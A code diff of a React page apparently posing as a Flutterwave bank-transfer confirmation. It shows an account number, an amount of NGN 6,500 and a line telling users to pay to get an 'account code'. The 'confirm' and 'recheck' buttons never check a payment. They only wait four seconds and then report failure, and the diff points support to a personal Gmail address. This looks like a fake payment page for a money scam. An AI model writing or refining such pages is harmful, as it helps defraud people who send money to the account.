@@ -10,12 +10,12 @@ const FlutterwaveConfirmation: React.FC = () => {
   const [paymentStatus, setPaymentStatus] = useState<"loading" | "failed" | "none">("none");
   
   useEffect(() => {
-    // Simulate loading and then failure after 3 seconds
+    // Simulate loading and then failure after 4 seconds
     if (paymentStatus === "none") {
       setPaymentStatus("loading");
       const timer = setTimeout(() => {
         setPaymentStatus("failed");
-      }, 3000);
+      }, 4000);
       
       return () => clearTimeout(timer);
     }
@@ -27,15 +27,21 @@ const FlutterwaveConfirmation: React.FC = () => {
   };
   
   const handlePaymentConfirm = () => {
-    toast.success("Payment confirmation sent!");
-    navigate("/dashboard");
+    setPaymentStatus("loading");
+    setTimeout(() => {
+      setPaymentStatus("failed");
+    }, 4000);
+  };
+  
+  const handleContactSupport = () => {
+    window.location.href = "mailto:nobleearn001@gmail.com";
   };
 
   const handleRecheck = () => {
     setPaymentStatus("loading");
     setTimeout(() => {
       setPaymentStatus("failed");
-    }, 3000);
+    }, 4000);
   };
   
   if (paymentStatus === "loading") {
@@ -117,7 +123,7 @@ const FlutterwaveConfirmation: React.FC = () => {
           
           <div className="mt-20 text-center">
             <p className="text-xl mb-4">Payment not confirmed, need help? contact email:</p>
-            <a href="mailto:support@example.com" className="text-blue-600 underline">here</a>
+            <a href="mailto:nobleearn001@gmail.com" className="text-blue-600 underline">nobleearn001@gmail.com</a>
             
             <button 
               onClick={handleRecheck}
@@ -132,7 +138,7 @@ const FlutterwaveConfirmation: React.FC = () => {
   }
   
   return (
-    <div className="min-h-screen bg-gray-100">
+    <div className="min-h-screen bg-white">
       <div className="bg-gray-200 p-4 flex justify-between items-center">
         <h1 className="text-xl font-bold">Bank Transfer</h1>
         <button 
@@ -149,7 +155,7 @@ const FlutterwaveConfirmation: React.FC = () => {
             <span className="text-white">🔄</span>
           </div>
           <div className="text-right">
-            <h2 className="text-2xl font-bold">NGN 6,200</h2>
+            <h2 className="text-2xl font-bold">NGN 6,500</h2>
             <p className="text-sm text-gray-500">chukwuemekajames562@gmail.com</p>
           </div>
         </div>
@@ -163,13 +169,13 @@ const FlutterwaveConfirmation: React.FC = () => {
             <div className="flex justify-between items-center">
               <div>
                 <p className="text-gray-600">Amount</p>
-                <p className="text-xl font-bold">NGN 6200</p>
+                <p className="text-xl font-bold">NGN 6500</p>
               </div>
               <button 
-                onClick={() => handleCopy("6200", "Amount")}
+                onClick={() => handleCopy("6500", "Amount")}
                 className="bg-yellow-500 text-white px-4 py-2 rounded"
               >
-                Copy
+                <Copy size={16} className="mr-1 inline" /> Copy
               </button>
             </div>
           </div>
@@ -184,7 +190,7 @@ const FlutterwaveConfirmation: React.FC = () => {
                 onClick={() => handleCopy("1703005963", "Account Number")}
                 className="bg-yellow-500 text-white px-4 py-2 rounded"
               >
-                Copy
+                <Copy size={16} className="mr-1 inline" /> Copy
               </button>
             </div>
           </div>
@@ -206,7 +212,7 @@ const FlutterwaveConfirmation: React.FC = () => {
         
         <div className="bg-gray-50 border rounded-lg p-4 mb-6">
           <p className="text-center mb-4">
-            Pay to this specific account and get your account your account code
+            Pay to this specific account and get your account code
           </p>
           
           <button
